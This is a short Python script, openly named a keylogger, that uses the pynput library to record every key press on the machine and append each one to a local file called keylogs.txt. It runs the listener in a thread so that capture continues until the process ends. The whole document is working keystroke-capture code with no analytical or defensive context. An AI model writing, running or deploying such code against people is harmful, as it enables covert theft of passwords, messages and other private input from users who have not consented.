import threading
from pynput.keyboard import Key, Listener

# Function to log the keys
def log_key(key):
    with open("keylogs.txt", "a") as log_file:
        log_file.write(f'{key}\n')

# Function to start the keylogger
def start_keylogger():
    with Listener(on_press=log_key) as listener:
        listener.join()

# Run the keylogger in a separate thread to keep it running
if __name__ == "__main__":
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

    # Keep the main thread running to avoid process exiting
    keylogger_thread.join()
